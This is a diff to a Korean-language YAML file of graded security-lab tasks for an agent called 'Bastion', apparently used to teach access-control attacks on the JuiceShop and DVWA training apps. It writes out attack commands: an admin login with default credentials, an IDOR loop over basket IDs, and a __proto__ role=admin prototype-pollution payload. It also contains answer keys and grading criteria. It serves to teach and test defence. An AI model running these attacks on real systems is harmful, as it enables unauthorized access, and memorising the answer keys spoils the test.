@@ -119,7 +119,9 @@ steps:
     alg 값을 신뢰하면 서명 없이도 변조된 토큰을 수용합니다. 방어: 서버에서 알고리즘을 고정하고 none을 명시적으로 거부해야 합니다.'
   verify:
     type: output_contains
-    expect: Forged JWT
+    expect:
+    - Forged JWT
+    - none
     field: stdout
     semantic:
       intent: JWT alg none 변조 — Header.alg=none + 서명부 제거 후 Payload 의 id 변경해 타 사용자
@@ -210,7 +212,9 @@ steps:
     수 있습니다. 이는 신뢰할 수 없는 데이터(쿠키)를 검증 없이 사용하는 대표적인 역직렬화 취약 패턴입니다.
   verify:
     type: output_contains
-    expect: First name
+    expect:
+    - First name
+    - low
     field: stdout
     semantic:
       intent: DVWA security 쿠키 변조 — impossible에서 low 로 변경 후 SQLi 실행 가능해짐을 검증
@@ -351,7 +355,9 @@ steps:
     시스템 명령을 실행할 수 있습니다.
   verify:
     type: output_contains
-    expect: Node.js Deserialization Payload
+    expect:
+    - Node.js Deserialization Payload
+    - payload
     field: stdout
     semantic:
       intent: <SENSITIVE:06359146fd1a5825>
@@ -427,54 +433,113 @@ steps:
   bastion_prompt: 역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_
     패턴을 차단하는지 확인하고, 직접 접근(포트 3000)과 비교해줘
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "권한 상승 chain — IDOR 수평 + Prototype Pollution 수직"
 
-    1) JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을 획득해줘
+    ## 상황 (w08 → w09 시나리오 연속)
 
-    2) 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를 확인해줘
+    w08 중간고사 끝났다. 후반부 시작 — 접근제어.
 
-    3) JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도해줘
+    > 선배: "권한 상승은 두 종류 — *수평* (다른 사용자) 과 *수직* (관리자). 표면은 비슷해 보이지만 위협 규모가 달라.
+    > 수평은 IDOR 로 basket/1, basket/2 같은 객체 ID 변조. 수직은 JWT id 변조 또는 prototype pollution
+    > 으로 role=admin 주입. JuiceShop 에서 두 케이스 다 시연하고, 권한 상승 매트릭스 정리해."
 
-    4) DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를 확인해줘
+    학습 목표 (lecture #1·#2 수평·수직 + #3 IDOR + #4 API 접근제어) + (lab #6 IDOR + #7 Prototype) 통합.
 
-    5) 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여 SQL Injection이
-    가능한 상태로 만들어라해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## 임무 (3 단계, 약 35분)
+
+    ### Phase A — 수평 권한 상승 (IDOR, lab #6)
+    1) admin 로그인으로 JWT 획득.
+       `curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+        http://10.20.30.80/rest/user/login`
+    2) 자신 basket id 조회: `curl -s -H "Authorization: Bearer <JWT>" http://10.20.30.80/api/Baskets/1`
+    3) 다른 사용자 basket: `for i in 2 3 4; do
+         curl -s -o /dev/null -w "basket/$i: %{http_code}\n" -H "Authorization: Bearer <JWT>"
+         http://10.20.30.80/api/Baskets/$i; done`
+    응답 코드 (200 → IDOR 성공 / 401·403 → 차단) 비교 분석.
+
+    ### Phase B — 수직 권한 상승 (Prototype Pollution, lab #7)
+    JuiceShop 의 admin 권한 추구 — `__proto__.role = "admin"` JSON pollution PoC.
+    `curl -s -X POST -H "Content-Type: application/json"
+     -d '{"email":"test@x.com","password":"x","__proto__":{"role":"admin"}}'
+     http://10.20.30.80/api/Users/`
+    응답에서 role 필드 캡처. `__proto__` 차단 여부 (실 차단 시 응답 코드 자체가 학습).
+
+    ### Phase C — 권한 상승 매트릭스 + 방어 권고
+    | 방향 | 공격 기법 | 입력 위치 | 핵심 방어 | 잔존 위험 |
+    | 수평 (IDOR) | object ID 변조 | URL 경로/쿼리 | 객체 owner 검증 | 검증 누락 endpoint |
+    | 수직 (JWT id) | id payload 변조 | JWT payload | 서명 검증 + role check | key leak |
+    | 수직 (Prototype) | __proto__ 주입 | JSON body | Object.freeze + parse 검사 | 라이브러리 취약 |
+    | 수평+수직 chain | IDOR → token 탈취 | 다단계 | 다층 인증 + audit log | 종합 모니터링 |
+    표 끝 "JuiceShop 권고: API endpoint 별 owner check + __proto__ 키 거부 + audit log" 한 줄.
+
+    종료: echo "=== Phase A IDOR ===" / "=== Phase B Prototype ===" / "=== Phase C 매트릭스 ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w09 권한 상승 chain]
+
+    JuiceShop (http://10.20.30.80) 수평·수직 권한 상승 시연 + 매트릭스 3 phase.
+
+    Phase A (IDOR 수평):
+    1) admin 로그인:
+       `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+        http://10.20.30.80/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
+    2) 자신/타인 basket 비교:
+       `for i in 1 2 3 4; do
+         curl -s -o /dev/null -w "basket/$i: %{http_code}\n" -H "Authorization: Bearer $JWT"
+         http://10.20.30.80/api/Baskets/$i; done`
+
+    Phase B (Prototype Pollution 수직):
+    `curl -s -i -X POST -H "Content-Type: application/json"
+     -d '{"email":"test'$(date +%s)'@x.com","password":"Test1234!","__proto__":{"role":"admin"}}'
+     http://10.20.30.80/api/Users/` 실행. 응답 status + body 의 role 필드 캡처.
+
+    Phase C (매트릭스):
+    ```
+    | 방향 | 공격 기법 | 입력 위치 | 핵심 방어 | 잔존 위험 |
+    | 수평 (IDOR) | object ID 변조 | URL 경로/쿼리 | 객체 owner 검증 | 검증 누락 endpoint |
+    | 수직 (JWT id) | id payload 변조 | JWT payload | 서명 검증 + role check | key leak |
+    | 수직 (Prototype) | __proto__ 주입 | JSON body | Object.freeze + parse 검사 | 라이브러리 취약 |
+    | 수평+수직 chain | IDOR → token 탈취 | 다단계 | 다층 인증 + audit log | 종합 모니터링 |
+    ```
+    표 끝 "JuiceShop 권고: API endpoint 별 owner check + __proto__ 키 거부 + audit log" 한 줄.
+
+    종료: echo "=== Phase A IDOR ===" / "=== Phase B Prototype ===" / "=== Phase C 매트릭스 ===" 묶음.
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: bash 변수 JWT 로 토큰 저장 후 loop 으로 basket 1~4 비교. 200 vs 401/403 분석.
+    Phase B: __proto__ 주입은 라이브러리에 따라 차단 여부 다름. JuiceShop 은 차단됨 — 시도 자체 학습.
+    Phase C: 4행 매트릭스 + 권고 한 줄.
+    포인트: 수평 vs 수직 권한 상승 차이 + chain 가능성.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: 매트릭스
     field: stdout
     semantic:
-      intent: '[통합] 역직렬화 5작업 — PHP/Python pickle/Java/chain/audit 통합. OWASP A08.'
+      intent: |
+        IDOR 수평 + Prototype Pollution 수직 권한 상승 시연 + 매트릭스.
+        lecture #1·#2·#3·#4 + lab #6·#7 동시 행동 증명.
       success_criteria:
-      - 5 deserialize 작업
-      - gadget chain
-      - RCE
+      - Phase A — admin 로그인 + basket 4개 비교 status code
+      - Phase B — __proto__ payload POST + 응답 캡처
+      - Phase C — 4행 매트릭스 + 권고 한 줄
       acceptable_methods:
-      - bastion plan
-      - ysoserial
-      - phpggc
+      - curl + python3 JWT 추출
+      - bash for loop basket
+      - JSON __proto__ payload
+      - markdown table
       negative_signs:
-      - gadget 없음
-      - RCE 실패
-      - audit 누락
+      - basket 1개만 조회
+      - __proto__ payload 누락
+      - 매트릭스 누락
+      - 수평·수직 구분 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하고 JWT 토큰을 획득해줘
-
-    2) 획득한 JWT 토큰의 구조를 분석하시오. Base64로 디코딩하여 Header(알고리즘)와 Payload(사용자 정보)를 확인해줘
-
-    3) JWT 토큰의 알고리즘을 none으로 변경하여 서명 검증 우회를 시도해줘
-
-    4) DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를 확인해줘
-
-    5) 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여 SQL Injection이
-    가능한 상태로 만들어라해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. JWT → basket loop → __proto__ 주입 → 매트릭스 echo.
+  answer_detail: |
+    JuiceShop 의 IDOR 차단 여부는 endpoint 별 다름. __proto__ pollution 은 보통 차단됨 — 시도 자체 학습.
+    핵심은 수평 vs 수직 + chain 관점.
   script: ''
